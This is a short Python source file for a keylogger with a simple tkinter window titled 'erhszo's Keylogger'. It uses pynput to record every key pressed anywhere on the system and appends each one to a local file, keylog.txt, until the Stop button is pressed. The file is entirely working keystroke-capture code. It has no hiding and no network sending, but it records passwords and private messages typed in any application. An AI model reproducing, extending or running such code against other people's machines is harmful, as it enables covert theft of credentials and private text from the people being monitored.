import tkinter as tk
from pynput.keyboard import Listener


class Keylogger:
    def __init__(self):
        self.listener = None

    def log_key(self, key):
        key = str(key).replace("'", "")
        with open("keylog.txt", "a") as file:
            file.write(key + "\n")

    def start(self):
        self.listener = Listener(on_press=self.log_key)
        self.listener.start()

    def stop(self):
        if self.listener is not None:
            self.listener.stop()
            self.listener = None


def create_gui(keylogger):
    root = tk.Tk()

    root.geometry("690x420")
    root.title("erhszo's Keylogger")

    label = tk.Label(root, text="Hello there!", font=("Montserrat", 20))
    label.pack(padx=30, pady=30)

    description = tk.Label(
        root,
        text="Click on 'Start' to start the keylogger and on 'Stop' to stop it.",
        font=("Poppins", 16),
    )
    description.pack(padx=5, pady=5)

    frame = tk.Frame(root)
    frame.pack()

    start_button = tk.Button(
        frame, text="Start", font=("Montserrat", 14), command=keylogger.start
    )
    stop_button = tk.Button(
        frame, text="Stop", font=("Montserrat", 14), command=keylogger.stop
    )

    start_button.pack(side=tk.LEFT, padx=20, pady=20)
    stop_button.pack(side=tk.LEFT, padx=20, pady=20)

    root.mainloop()


keylogger = Keylogger()
create_gui(keylogger)
